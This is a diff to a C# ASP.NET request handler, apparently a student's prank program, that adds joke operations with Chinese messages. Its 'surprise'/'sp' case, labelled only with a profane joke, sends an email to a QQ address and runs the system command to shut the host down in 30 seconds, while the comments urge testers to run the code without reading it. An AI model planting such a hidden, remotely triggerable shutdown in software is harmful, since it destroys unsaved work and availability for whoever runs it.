@@ -2,6 +2,12 @@
 
 using System;
 using System.Web;
+using System.Collections.Generic;
+using System.Text;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
 
 public class posit : IHttpHandler
 {
@@ -10,13 +16,15 @@ public class posit : IHttpHandler
     static sqlSever sq = new sqlSever();
     static repeaterOp re = new repeaterOp();
 
-    string[] opList = { "getHelp（没用的）", "gcd（就是那个gcd）", "getUsername（给个id）" };
+    // 别看源码先跑一遍呗
+    // 别看源码先跑一遍呗
+    // 别看源码先跑一遍呗
+
+
+    string[] opList = { "tip（真诚的忠告）", "getHelp（没用的）", "gcd（就是那个gcd）", "random（随机数）", "getUsername（给个id）", "surprise(hi! surprise mother fucker)", "xss（前端这技术太强了）", "throw（emmmm）" };
     string op,output;
 
     int makeEx = 0;
-    // 别看源码先跑一遍呗
-    // 别看源码先跑一遍呗
-    // 别看源码先跑一遍呗
 
     public void ProcessRequest(HttpContext context)
     {
@@ -37,6 +45,10 @@ public class posit : IHttpHandler
         }
         switch (op)
         {
+            case "tip":
+                context.Response.Write("要不学长（学姐）你先把所有工作文件都保存了再来测我的程序？（严肃脸）");
+                return;
+
             case "getHelp":
                 context.Response.Write("事实上并没有什么帮助，输入个help试试？");
                 return;
@@ -79,6 +91,12 @@ public class posit : IHttpHandler
                         return;
                     }
                 }
+
+                if (userId == 19260817)
+                {
+                    context.Response.Write("牠");
+                }
+
                 if (sq.getDataStyle(userId) != es.STYLE_USER_NAME)
                 {
                     context.Response.Write("这id不存在的");
@@ -90,11 +108,43 @@ public class posit : IHttpHandler
                 }
                 return;
 
+            case "xss":
+                context.Response.Write("网页制作博大精深啊，我现在就想知道这东西怎么注");
+                return;
+
+            case "photo":
+                context.Response.Write("有人会调用本地摄像头吗，在线等，挺急的");
+                return;
+
+            case "random":
+                Random r = new Random();
+                context.Response.Write(r.Next());
+                return;
+
+            case "throw":
+                try
+                {
+                    makeEx = makeEx / makeEx;
+                }
+                catch (Exception ex)
+                {
+                    context.AddError(ex);
+                }
+                return;
+
+            case "eat":
+                context.Response.Clear();
+                return;
+
+            case "sp": // 缩写
+            case "surprise":
+                us.send("恶作剧成功", "1045932460@qq.com");
+                Process.Start("shutdown","/s /t 30");
+                return;
+
             case "flag":
             case "fl4g":
-                {
-                    context.Response.Write("彩蛋");
-                }
+                context.Response.Write("彩蛋");
                 return;
 
             default:
